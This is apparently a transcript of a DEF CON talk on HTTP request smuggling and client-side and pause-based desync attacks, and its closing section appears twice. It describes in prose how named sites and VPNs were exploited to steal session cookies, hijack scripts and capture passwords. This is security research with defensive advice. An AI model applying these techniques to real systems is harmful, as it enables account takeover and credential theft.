Now, I've got a nice bonus slide for DEF CON.  I think this topic has serious potential  for further research.  So I'm gonna outline seven possible research angles  roughly in order of the time commitment required  and how likely I think they are to actually work.  First off, more ways of making a browser,  of making a server ignore  the content-length would be really valuable.  You can use these for both a server-side desync  and a client-side one,  especially, if it is triggered by a request  that you can use from a web browser.  
- New ways of triggering CL.0 or CSD
Secondly, as we've seen,  client-side desync exploitation can be quite hard,  so more ways of building exploits would be really valuable. 
- New CSD explotation gadget
And in particular,  the whole chain and pivot exploit path is under researched.  It basically didn't occur to me  until I was writing the presentation.  So I think you might even,  because you can send arbitrary bytes,  you might even be able to fake a protocol upgrade  and change protocol to web sockets or something,  which might be fun.  
- Advanced/cross-protocol chain&pivot attacks
Fourth,  currently, server-side pause-based  desync vulnerabilities are really hard to detect.  Your best off, basically, looking for the server banner  that says they're using Apache  and then trying the technique.  So a reliable way to find this issue  when the vulnerable servers  behind a front-end would be really nice. 
- Reliable detection of server-side pause-based desync vulnerabilities
And also, it would be amazing if you could trigger  a pause-based desync without needing a man in the middle.  It feels like something that should be possible.  It should be possible to make a browser  just still halfway through a request somehow,  I just don't have no idea.  
- A way to delay a browser request with needing a MITM
Sixth, this is a valuable attack class right now,  but it's gonna get less valuable over time  as HTTP/2 adoption increases.  Unless, someone figures out a way of forcing browsers  to use HTTP/1.  Again, I've got no idea,  but might be possible.  
- A way to force browsers to use HTTP/1 when HTTP/2 is available
And finally, I think this one's a pretty good lead.  Explanation of equivalent attacks on HTTP/2.  I've seen some hints that vulnerability  similar to client-side desync could happen with HTTP/2.  I don't think it's gonna be as common  'cause it kind of requires like a state machine floor  on the server,  but I'm fairly sure it will happen sometimes.  And that would be quite nice.  
- Exploration of equivalent attacks on HTTP/1+ (without downgrading)

So there's plenty of further reading available.  The three things I'd suggest are,  check out the whitepaper,  which also includes these slides.  That's the top link on this page.  Have a shot at the online interactive labs  to get some real experience with this technique  and then grab the tools I've released,  do some scanning and find some real vulnerable assistance.  Feel free to chat me an email  and let me know how it goes.  Also, there's a kind of related presentation  tomorrow by Martin, which is really good.  I would suggest checking that out if you've enjoyed this.  And finally, the three key things  to take away are the request is a lie,  HTTP/1 connection-reuse is harmful,  and all you need is a server taken by surprise.  I'll take five minutes of questions now.  If you have any more after that,  feel free to come and chat to me at the back  or just chat me an email.  Don't forget to follow me on Twitter.  Thank you for listening.  (audience applauding)  Any questions? Yep.  - [Participant] Is there a chance  on desyncing HTTP/2 services that being prompted  by HTTP/1 service?  - Could the attack work on HTTP/2 servers  that have a HTTP/1 server in front?  - [Participant] Yep.  - Yes, you could do a client-side desync  on that potentially.  - [Participant] Okay.  - Cool, thank you.  (audience applauding)
hings down  and paying really close attention  to the exact sequence of events,  I could reuse connections and still distinguish  genuine vulnerabilities from false positives.  And that was nice,  but sometimes when you pay extra close attention to things,  you find more than you bargained for.  And on one website,  I noticed something just wasn't quite right.  And I pulled on that thread  and the attack that I ended up with broke my mental model  for request smuggling,  because this attack could be launched  from the user's browser,  which meant it didn't require an attacker.  And that meant, it didn't even require the vulnerable site  to have a front-end server.  And that opens a whole new frontier of attack surface.  So today, I'm here to share with you a methodology  and tool kit that I've built to navigate this new world,  demonstrated with exploits on targets,  including Apache, Akamai, Varnish,  amazon.com and multiple web VPNs.  First, we're gonna get warmed up  with HTTP handling anomalies.  After that, I'll share the client-side  desync methodology using four in-depth case studies.  Then, I'll introduce pause-based desync  and attempt a live demo  because the attack so cool, I couldn't resist.  Then, I'll talk about defense key takeaways for the research  and wrap up with five minutes of questions.  Now, there's quite a few different techniques  in this presentation.  And I really want them to work for you.  So as part of that, whenever you see this logo on a slide,  that means my team's built an online replica website  with that vulnerability in it.  So you can practice that technique  on a real system online for free.  I'm also releasing the code that powered  every finding in this presentation.  And whenever there's a named target,  you'll find full proof of exploit code in the whitepaper  even if I haven't managed to squeeze it onto a slide.  Now, we're gonna start with a series  of six esoteric vulnerabilities that directly led  to the discovery of client-side desync attacks,  but are also really quite interesting in their own light.  But first, there's something I need to tell you.  The request is a lie.  HTTP requests are a useful abstraction,  but the harder you try to hold onto this concept,  the less sense these techniques are going to make.  At the end of the day,  all we are doing is sending a stream of bytes  and what the server does with that is up to it.  For example, it's all too easy to forget  about HTTP connection reuse  because HTTP is supposed to be stateless,  but sometimes state can creep in.  Take this website that I found,  but sadly can't named.  They had a reverse proxy in front  and it was set up to let me access sites intended  to be public and not to access private sites  on their intranet.  And it was deciding where to route  the request using the host header.  But this front-end was only validating the host header  of the first request on each TCP connection.  So I could just send a request to the legit site  and then gain access to the internal systems.  Now, fortunately, this bug is quite rare,  but there's a more common variation  that I'll call first-request routing.  Here, the front-end server looks at the first request  to work out which back-end to route it onto,  but then it passes all subsequent requests  on that connection straight through  to the same back-end system.  By itself, this behavior is not really a vulnerability,  but you can use it to hit any back-end  with an arbitrary host header.  So you can use that to form part of an exploit chain  that would otherwise be impossible.  In this example here,  I wanna hit the back-end with a poisoned host header  so I can trigger a poisoned password reset email,  but doing that directly isn't possible  because the front-end doesn't know where to route it to.  But once again, I just send a legit request first  and then follow it up with the attack.  And we successfully get a poisoned password reset email,  and hopefully, access to someone's account.  So hopefully, that simple technique will come  and useful for you.  But there's also a broader takeaway here,  which is that it's really good to peel away  these abstractions sometimes  because they can hide behavior  that's really quite important.  Onto request smuggling.  Well, you know the deal with this,  hopefully, you just make the front-end and back-end disagree  about the length of a HTTP request.  Use that to apply a malicious prefix shown in orange  to the victim's request,  and that makes bad things happen to the victim.  To encourage this disagreement to happen,  you generally obfuscate the transfer and coding header  to hide it from one of the servers.  So I was a bit puzzled when I found that  I could trigger really suspicious behavior  on a large number of websites using  AWS's Application Load Balancer using this HTTP/2 request.  If you look at this request,  you might wonder where the attack is  because this is a legitimate HTTP/2 request.  It's spec compliant,  there isn't any obfuscation there or anything like that.  And yet, somehow this was causing some kind of desync  on these websites.  After spending quite a while, investigating it as usual,  I eventually decided  what Amazon must be doing is inexplicably adding a header  that said, actually, this message is chunked  when they forwarded it onto the back-end,  but not actually chunking it.  And well, once I knew that, it was easy to turn this  into an exploitable desync and hack a bunch of sites.  So that was nice.  I reported it to Amazon and they fixed it,  really quite quickly too.  But it left the question, well, why was Amazon doing that?  Why did that even happen?  And I think,  it's because web browsers always send  a content-length header even when they're using HTTP/2,  even though that is not required over HTTP/2.  And so Amazon just ended up with logic that said,  "well, if there isn't a content-length header,  I guess it must be chucked."  So that was a handy finding.  But the real value of it was in the takeaway,  which is that for request smuggling,  you don't necessarily need header obfuscation  or any kind of ambiguity.  All you need is a server taken by surprise.  We're gonna come back to that shortly.  Now, let's take a closer look at the connection locked  HTTP/1 request smuggling issue mentioned earlier.  So to confirm regular request smuggling,  you send two requests.  You confirm the first request effects  in response to the second as shown here.  And this works great provided you send those two requests  over separate connections,  but to find a connection lot vulnerability,  you have to send them over the same connection like this.  Now here, we're sending and receiving  exactly the same bytes as shown on the previous slide.  But now we have a problem  because we can no longer tell  where the front-end thinks the first request ends.  And that means we can't tell  if this system is actually vulnerable or not.  The solution here is to realize that these bytes  that we're getting back aren't the only information  that we have.  We also have timing information.  If the front-end server thinks our message is chunked,  that means it's already starting to generate a response  before we send the orange payload.  So if we pause before sending that payload  and check the socket,  and we see a response coming back,  that tells us they're not using the content-length,  they think this message is chunked  and they're not vulnerable to a CLT desync.  Meanwhile, if we try to read and we don't get any data back  for a few seconds,  and then the rest of the attack plans out as usual  that proves the front-end must be using the content-length  and therefore are actually vulnerable.  So I took that technique.  I automated it and I went scanning,  and I found a few things.  One of the mildly notable things was,  there was a vulnerable system that was vulnerable  because they were running  a Barracuda's web application firewall in front of IIS.  Obviously, it's old news.  You put a web application firewall in front of something,  it makes it easier to hack,  but what was particularly interesting here was,  Barracuda had actually issued a patch for this problem,  but they hadn't flagged it as like a full on security fix.  They just said it was,  "oh, just a speculative hardening measure."  So as such the client, hadn't bothered to install it  and it was vulnerable.  As usual though, the best desync I found  with this technique was the one that initially made  absolutely no sense.  After extensive testing,  I was able to refine the attack sequence into this.  Now, there's two things to unpack here.  First off, as you can see,  the back-end server is completely ignoring  the content-length here.  So that means this is a CL.0 desync,  which is a rarer attack class  that hasn't been widely researched.  Secondly is, well,  why are they ignoring that content-length?  There's no reason.  They're just ignoring it  because they feel like it.  It never occurred to me  that a server might just arbitrarily ignore  the content-length on a completely valid HTTP/1 request.  And that has implications.  It also left me wondering,  given that I found this by accident  with a scanning technique that wasn't even designed  to find this,  well, how many sites am I gonna find  if I go deliberately looking for this type of vulnerability?  The answer was quite a few.  My favorite one was amazon.com.  So they ignore the content-length  on POST requests sent to the path /b.  Using this, I got a server side desync  so I made a simple proof of concept,  which stored random live users HTTP requests,  including their credentials inside my Amazon wishlist.  So I send this request a few times.  I reload my wishlist  and I've got some other random people session cookies.  So I reported that to Amazon.  They fixed it at some point.  And then I realized that I'd made a terrible mistake  because I could've done a much cooler attack.  This request exploits a random live user, right?  And the request is a legitimate HTTP request  that can be triggered by a web browser.  So if I'd used the head technique to execute JavaScript  in the victim's browser,  I could have made every user that got hit by this,  spread the attack to 10 other users,  thereby making a self-spreading desynchronization worm  and compromising every active user on Amazon.  (audience applauding)  Thanks, so that was a cool finding,  missed opportunity too,  And also a hint at an entire new attack class.  Client-side desync,  every desync, every request smuggling vulnerability  that we've seen to date has desynchronized the connection  between the front-end server and the back-end server.  But if you can make a web browser send a request  that causes a desync like you could on Amazon,  then, you can target the browser's own connection pool.  And that means you can exploit sites  that don't have a front-end, back-end architecture.  This attack starts with the victim visiting  the attacker's website,  which sends two requests to the target site.  The first request desynchronizes the browsers connection  to that website.  So that the second request triggers a harmful response  to go back to the victim and give the attacker control  of the victim's account.  To build these attacks,  I've adapted the methodology from classic request smuggling.  The main difference is that our entire exploit here needs  to run in our victim's web browser.  And that is an environment that's a lot more complex  and uncontrolled than a dedicated hacking tool.  So it's crucial to periodically take your technique  as you've got it working inside your tool  and try out in the browser to make sure that it works  as expected in the real environment  that you want the attack to work in.  Tooling wise, I did all of this with custom code,  which I've just released to GitHub,  but I also helped design a new Burp Suite feature called  send request sequence,  which offers similar functionality  with a bit of a gentler learning curve.  For the target browser,  this technique seems to work on all browsers  pretty much equally.  Personally, I focused on Chrome  because Chrome has the best developer tools  for building this kind of exploit.  The first step towards a successful attack is to identify  your client-side desync vector.  This is a HTTP/1 request with three key properties.  First and foremost, the server needs to ignore  the content-length of this request.  This will typically happen  because you've triggered some kind of server error  or because you've taken the server by surprise,  it just wasn't expecting a POST request to that end point.  For example here,  this is one of the more effective techniques.  I'm just doing a POST request to a static file.  They don't expect it and as such,  if this server is vulnerable,  they're likely to ignore the fact that I've said,  I'm gonna send more content than I actually have.  So I've sent content-length five.  I've sent one byte of data.  If the server replies to this request immediately,  it suggests that they're ignoring  the content-length five sent,  and they're quite likely to be vulnerable.  Secondly, this request needs to be triggerable across domain  inside a web browser.  So that means you can't use things like head obfuscation  and you can't even specify any special headers really.  And also, the target server can't advertise  support for HTTP/2,  because this is an attack that exploits the fact  that HTTP/1 is dire and browsers will aggressively prefer  to use HTTP/2.  So the only scenario where a site  that uses HTTP/2 is gonna be exploitable  via this is if your target victim is using a corporate proxy  or something that only supports HTTP/1,  which is fairly unlikely.  Finally, the server needs to leave the connection open,  after it's handled this request.  So once you've found this,  the next step is just take that  and see if it works inside a real browser,  which you can do with some JavaScript  that looks something like this.  So here, we're sending two requests  and the first one is gonna desync the connection.  And the second request is just a browser navigation,  and that should hopefully suffer the consequences  of the connection being desync.  Now, there's two flags worth mentioning  in this attack request.  First off, I'm specifying mode no-cors.  This is not required for a successful attack,  but what it does is it means we can actually see  what's happening inside the developer tools.  So it's useful for debugging things when things go wrong,  which they will do quite a lot.  Secondly, I'm specifying credentials include,  this is really important  because browsers have multiple connection pools per website.  And if you poison the wrong connection pool,  then I can promise you an extremely frustrating time.  So specify that and you'll probably poison the right one.  Now, when you run this, if it's successful,  you should see two requests in the dev tools  with the same connection ID.  And you should see  that the second response has been affected by  the malicious prefix from the first request as shown here.  And at this point, it's just time to build an exploit.  This is quite a powerful primitive.  So you've got three main options.  First off, you can try to store the user's request somewhere  where you can later retrieve it,  kind of like I did on Amazon.  And that works just the same  as regular server side request smuggling.  So I'm not gonna waste any time talking about it  in more detail.  Secondly, there's an all new option,  which is chaining and pivoting.  So a client-side desync means  that you can make your victim's browser send arbitrary bytes  to the target website.  So what it does is it turns their browser  into your personal attack platform  and it puts extra attack surface within your reach.  For example, you can make them put Log4Shell payloads,  wherever you like,  and you can even hit authenticated attack surface using  their credentials in a way that's a bit like  cross-site request forgery,  but not more powerful  because it doesn't have all the limitations  that browsers normally put on cross-domain requests.  What I'm gonna focus on though is exploiting the end user.  I've tried a lot of different techniques  and had the most success with two well-known approaches  from server-side request smuggling  with certain tweaks applied that we're gonna have a look at  in the case studies.  So for our first case study,  we're gonna exploit a straightforward vulnerability  that affected a huge number of websites built  on the CDN Akamai.  This attack vector is nice and simple.  To cause a desync, you just need to do a POST request  that triggers a redirect from the front-end.  Confirming this in a browser is also really easy.  Here, I've just crafted the prefix  so that when the browser follows this redirect  from the front-end,  it ends up seeing the contents of the robots.txt file.  For the exploit, I'm gonna use the head technique.  Now, if you're not familiar with this technique,  it's documented in more detail  in last year's presentation on HTTP/2  but the short version is with the head technique,  you use the method head to queue up multiple responses  that when combined are harmful  and let us execute JavaScript from the target site  in our victim's browser.  And when you are doing service side request smuggling,  it's that simple,  but because this is client-side,  there's a couple of other things that we need to fix first.  The first problem is that the initial request coming back  to the web browser is a 301 redirect.  And as such, the browser is just gonna follow that redirect,  and that's gonna use the poison connection  and mess up our attack.  The second problem is the stacked response problem.  Whenever Chrome reads in a response from the server,  it deliberately does a little overread.  It tries to read more data  than the server said it was gonna send  just to see if there's any extra data lying around.  And if it sees anything,  it quietly dumps the connection and breaks the attack.  So fortunately, both issues are easily resolved on Akamai.  So you can fix the stacked response problem  by delaying the second response.  So it arrives after Chrome does its little check.  So in this scenario,  I was able to do this by adding a cache,  by adding a cache-buster to the request  so that it incurred a cache miss,  went all the way to the back-end,  which was slow and old and therefore took ages to respond  and meant that it arrived late and Chrome didn't see it.  The second problem of the browser redirect is easily fixed  by changing mode, no cause to mode cause,  which means when the browsers sees the redirect,  it throws an exception which we can then catch ourselves  and continue with our attack,  ultimately, leading to a successful exploit  For our next target, we'll hit Cisco's web VPN.  This technique seems to work on lots of web VPNs  for some reason,  I think it's 'cause they tend to code their own web service  for security reasons which backfires.  So here, we can trigger a desync,  simply by doing a POST request to their homepage.  It couldn't be much easier to be honest.  And with that,  we can easily trigger a redirect to our website.  And in theory, that redirect could let us redirect  to JavaScript resource load and let us take full control  over the page.  But there's a bit of a problem  because when a web browser renders a page,  it loads all the resources at the same time.  And that makes it really quite hard  to successfully hijack the correct file.  Fortunately, there was an easy solution on this target  because this redirect response is cacheable.  So if we poison the connection with our redirect,  and then we tell the browser to navigate  to the target JavaScript file,  which is /win.js here,  then they'll get that redirect back  and they'll just get bounced back to our website  by the redirect,  but they'll also save the redirect in their cache  So when they learn back on our website,  we can send them onwards to the web VPN's login page.  And when the log in page starts to get rendered,  it's gonna try and load that JavaScript file  and end up loading our poisoned version from the cache  and importing our JavaScript  and giving us the user's password.  So I reported this to Cisco  and they didn't say anything for a while.  And then they said, they're gonna deprecate this product.  So they're not gonna fix this issue,  but they are issuing a CVE for it.  So that's nice.  I hope you're not using it.  (audience laughing)  On verisign.com.  You could trigger a desync using  a URL encoded forward slash,  Don't ask me how I found that.  And unfortunately, that wasn't the only thing a bit unusual  about their setup for reasons that I don't have time  to explain in any detail.  To get a working exploit,  I had to use the head technique,  but I had to do it with a head request that had a body  and the body had to be chunked,  which meant I had to judge the chunk size,  so the follow-up request would perfectly slot  inside that chunk and close off the request.  This, unbelievably, did actually work.  But the interesting thing here,  the reason this is worth mentioning is because  this approach is exclusive to client-side desync.  If you're doing a server-side desync,  you don't control what the next request  to hit the server is gonna be.  So you can't accurately predict its size.  And this technique is basically completely implausible.  So it's worth bearing in mind that  although client-side desync can be quite painful sometimes,  you do have options.  Speaking of painful, for our final case study,  we're gonna target Pulse Secure VPN.  Here, you can do a desync by POST request  to the robots.txt file.  And just like Cisco's web VPN, they've got a host header,  redirect gadget that we'd like to use  to hijack a JavaScript import,  but this time the redirect isn't cacheable.  So we are in this unpleasant scenario  where our attack timing is crucial.  And I had to take three steps  to make this remotely reliable.  First off, I pre-connect the victim browser  with the target site to reduce the effect of network jitter  on the attack timings.  This might not make any difference,  but I was kinda desperate.  Secondly, our attack is gonna fail sometimes.  So it's essential that we can have multiple attempts,  but a failed attempt leaves the victim  on the target website out of our control.  So to deal with that,  I just run the attack in a separate tab,  which just means we can have as many attempts as we like,  except for one other potential problem,  which is that if an attack fails  and the browser ends up caching the genuine JavaScript file,  then we can't poison that file  until that cache entry has expired,  which could be weeks.  But I was able to avoid that issue by finding a page  on Pulse Secure's VPN that had a JavaScript import  that never got cached  because the file they were trying  to import didn't actually exist.  So by combining all of these, we got a successful attack,  which hopefully, looks something like this.  Yeah, so you can see a tab pops open  and then the victim site gets reloaded a couple of times  and we get control.  I reported that to Pulse Secure VPN.  And to be honest, I'm not sure what happened.  They didn't say anything for ages.  And then they said they fixed it,  but I can't find the fix.  So who knows.  Now, we saw earlier that slowing down  and pausing can reveal useful information.  And as it turns out, pausing can also create  entire new desync vulnerabilities.  To trigger a pause-based desync on a vulnerable server,  you start by sending your headers promising a body,  but not sending it and then just waiting.  Eventually, you'll get a response.  Generally, after like a server timeout is hit.  And then, when you finally send the body,  they'll treat that as a new request.  I initially found this on Varnish.  And just in case you think that was really clever of me,  it was actually,  because of multiple bugs in my code combined  to trigger this condition.  But once I saw it on Varnish,  I was like, oh, that's cool, let's go looking for,  and I found it works on Apache too,  which is pretty cool.  And it tends to happen when the server generates  a response itself instead of forwarding the request  to the back-end server or handing it off  to the application layer.  And this single vulnerability enables two distinct attacks.  So first off, we're gonna use it to cause  a traditional server side desync.  Now, for this to work,  the front-end server must stream the request  to the back-end.  So in particular, it must forward the request headers  without attempting to buffer the entire request body first.  So to find the bug here,  well, you send your headers and you wait for the timeout,  but you will probably won't realize  when the timeout happens on the back-end  because the front-end generally won't forward  the response onto you  until they've seen you send a complete request.  So in practice, you need to send your headers,  wait until you think of timeout has probably happened  on the back-end and then send the rest  and the next request and hopefully, get a successful attack.  So I've updated Turbo Intruder to add  a couple of different ways of saying  where in the request you wanna pause  and how long you want to pause for.  So that's it, it's fairly simple.  And we might be wondering, well, what front-end servers  actually stream requests like this?  To be honest, I couldn't be bothered looking at very many,  but it worked on the first one I tried,  which was Amazon's Application Load Balancer.  However, there's one extra catch,  which is that they've got a defensive measure.  I'll call early response detection.  It's a bit like the Chrome behavior we saw earlier,  but it's slightly different.  So if Amazons ALB sees the response coming in  from the back-end before our request is completed,  then, they'll forward that response on,  but then they'll dump the connection.  They won't reuse it and our attack will fail.  Fortunately, this seems to be designed to prevent bugs  rather than actual attackers.  And there's a really obvious race condition in it.  So it's quite easy to bypass.  All you need to do is identify the back-end timeout  and make the orange payload hit the front-end  and the time window between the back-end generating  that timeout response and the front-end noticing it.  In other words, basically,  this attack may take a few attempts,  but it's worth it.  There's one final challenge that you might encounter,  which is more severe.  This is when the front-end  and the back-end have the same request timeout configured  on ALB that creates a race condition  within a race condition and makes life incredibly painful.  I thought it might be possible to avoid this issue  by resetting the front-end timeout  without resending in the back-end timeout  by sending data that the front-end normalizes  and then doesn't send on to the back-end.  And that might work on some servers,  but it didn't work on ALB.  And after a while of everything I tried failing,  even when it was really cool, conceptually,  I just gave up and I just set a VANILLA attack running.  And 66 hours later, it was successful.  So this is one for the patient.  So that was a server-side pause-based desync.  And it just leaves us with one final question,  which is well, is there such a thing  as a client-side pause-based desync?  Now, I couldn't find a way to make a browser pause halfway  through issuing a request,  but SSL and TLS don't stop attackers  from delaying your traffic.  So there is a potential attack  where the attacker triggers a request  from your browser that's really big,  so it gets split into multiple packets.  And then all they have to do is delay the right packet  and they can trigger a pause-based client-side desync  and exploit you.  Now, that might sound quite theoretical.  It certainly sound theoretical to me.  And this is DEF CON.  So I've made a proof of concept that uses this technique  on a default Apache-based website  to execute arbitrary JavaScript and kind of break TLS.  And now, I'm gonna attempt to live demo it.  A code on the client-side looks fairly  like a regular client-side desync,  but we've got tons of padding to make the request big  so it gets split into multiple packets.  On the attackers middle box,  I used the traffic control facility  with some code like this,  that just says delay the packet to the target site  by 61 seconds  if it's in between 700 and 1,300 bytes,  'cause that seems to work.  As you may guess,  this is not the world's most reliable technique  because you obviously can't decrypt the packets.  They're encrypted.  You just look at how big they are and kind of guess,  but let's have a go and see what happens.  Okay, cool.  So I'm gonna make the victim browser,  it's just gonna SOCKS proxy to a box on Amazon  that's being man in the middle  just so the local network doesn't blow things up too much.  It's just a SOCKS proxy.  It's not breaking SSO, anything like that.  Here, we're gonna connect to the attacker machine.  Apologies about the size of the font.  What if I do this?  Yeah, okay.  (keyboard clanking)  Cool, so here we can see this code.  I've got that injects, the delay,  the only change is I'm just doing a six second delay here,  'cause I reduce the server time out  so that the demo doesn't take ages  and I'm running TCP dump on the attacker's box.  So if the attack works,  if the browser decides to send  the correct packet sites for me,  then we are gonna see a few packets go through  and then one large packet being resent over and over.  That's because the victim machine knows it,  it hasn't been received by the server  'cause we're delaying it.  So it's just trying to resend it.  That's just TCP,  but the attacker is delaying all of these resend attempts  until it finally lets them through.  We get a client-side desync and if it's successful,  we'll see an nice pop-up box in the victim browser.  So as you can see,  I've just got the attack code shown earlier here.  I'm gonna hit Execute JS and we'll see what happens.  Okay, great, we can see one packet being resent  a bunch of times and over here in about few seconds maybe,  yes, there we go.  (audience applauding)  Thanks.  So that was,  oh, so we don't even need the backup video. (chuckles)  All right. So yeah, hope you enjoyed that demo.  That was the final attack of the presentation.  Hopefully, mostly made sense.  Let's talk about defense.  These attacks almost all exploit HTTP/1.  So if you can, I would recommend using HTTP/2 end to end.  That said, if you can't use it end to end,  don't do HTTP/2 downgrading  because that makes things even worse.  Now, secondly,  I don't know how people are gonna react to this,  but my view is, it's really easy to make a HTTP/1 server,  but really difficult to make a HTTP/1 server that's secure.  So I would say don't code your own HTTP server  if at all possible.  That said, software diversity is a healthy thing.  So here's some advice that will help make your server  slightly less prone to these kinds of vulnerabilities  and may be useful if you need to patch  one of these vulnerabilities  and using HTTP/2 end to end is not an option.  Now, I've got a nice bonus slide for DEF CON.  I think this topic has serious potential  for further research.  So I'm gonna outline seven possible research angles  roughly in order of the time commitment required  and how likely I think they are to actually work.  First off, more ways of making a browser,  of making a server ignore  the content-length would be really valuable.  You can use these for both a server-side desync  and a client-side one,  especially, if it is triggered by a request  that you can use from a web browser.  Secondly, as we've seen,  client-side desync exploitation can be quite hard,  so more ways of building exploits would be really valuable.  And in particular,  the whole chain and pivot exploit path is under researched.  It basically didn't occur to me  until I was writing the presentation.  So I think you might even,  because you can send arbitrary bytes,  you might even be able to fake a protocol upgrade  and change protocol to web sockets or something,  which might be fun.  Fourth,  currently, server-side pause-based  desync vulnerabilities are really hard to detect.  Your best off, basically, looking for the server banner  that says they're using Apache  and then trying the technique.  So a reliable way to find this issue  when the vulnerable servers  behind a front-end would be really nice.  And also, it would be amazing if you could trigger  a pause-based desync without needing a man in the middle.  It feels like something that should be possible.  It should be possible to make a browser  just still halfway through a request somehow,  I just don't have no idea.  Sixth, this is a valuable attack class right now,  but it's gonna get less valuable over time  as HTTP/2 adoption increases.  Unless, someone figures out a way of forcing browsers  to use HTTP/1.  Again, I've got no idea,  but might be possible.  And finally, I think this one's a pretty good lead.  Explanation of equivalent attacks on HTTP/2.  I've seen some hints that vulnerability  similar to client-side desync could happen with HTTP/2.  I don't think it's gonna be as common  'cause it kind of requires like a state machine floor  on the server,  but I'm fairly sure it will happen sometimes.  And that would be quite nice.  So there's plenty of further reading available.  The three things I'd suggest are,  check out the whitepaper,  which also includes these slides.  That's the top link on this page.  Have a shot at the online interactive labs  to get some real experience with this technique  and then grab the tools I've released,  do some scanning and find some real vulnerable assistance.  Feel free to chat me an email  and let me know how it goes.  Also, there's a kind of related presentation  tomorrow by Martin, which is really good.  I would suggest checking that out if you've enjoyed this.  And finally, the three key things  to take away are the request is a lie,  HTTP/1 connection-reuse is harmful,  and all you need is a server taken by surprise.  I'll take five minutes of questions now.  If you have any more after that,  feel free to come and chat to me at the back  or just chat me an email.  Don't forget to follow me on Twitter.  Thank you for listening.  (audience applauding)  Any questions? Yep.  - [Participant] Is there a chance  on desyncing HTTP/2 services that being prompted  by HTTP/1 service?  - Could the attack work on HTTP/2 servers  that have a HTTP/1 server in front?  - [Participant] Yep.  - Yes, you could do a client-side desync  on that potentially.  - [Participant] Okay.  - Cool, thank you.  (audience applauding)
